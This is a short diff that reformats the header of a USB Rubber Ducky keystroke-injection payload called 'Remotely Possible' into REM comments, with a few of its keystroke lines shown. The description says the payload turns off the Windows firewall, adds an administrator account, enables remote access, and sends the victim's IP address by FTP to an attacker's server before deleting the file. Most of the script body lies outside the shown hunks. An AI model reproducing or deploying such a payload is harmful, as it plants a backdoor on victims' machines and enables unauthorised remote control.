@@ -1,11 +1,10 @@
-Remotely Possible
+REM Remotely Possible
+REM 
+REM Author: Bucky67GTO
+REM Duckencoder: 2.2
+REM Target: Windows 7
+REM Description: Script for turning off the firewall, adding a user, making it an administrator, enabling remote access and sending (by FTP) the IP number to a server of your choice, then deleting the file.
 
-Author: Bucky67GTO
-Duckencoder: 2.2
-Target: Windows 7
-Description: Script for turning off the firewall, adding a user, making it an administrator, enabling remote access and sending (by FTP) the IP number to a server of your choice, then deleting the file.
-
-```
 DELAY 2000
 ESCAPE
 CONTROL ESCAPE
@@ -70,4 +69,3 @@ ENTER
 DELAY 400
 ALT SPACE
 STRING c
-```
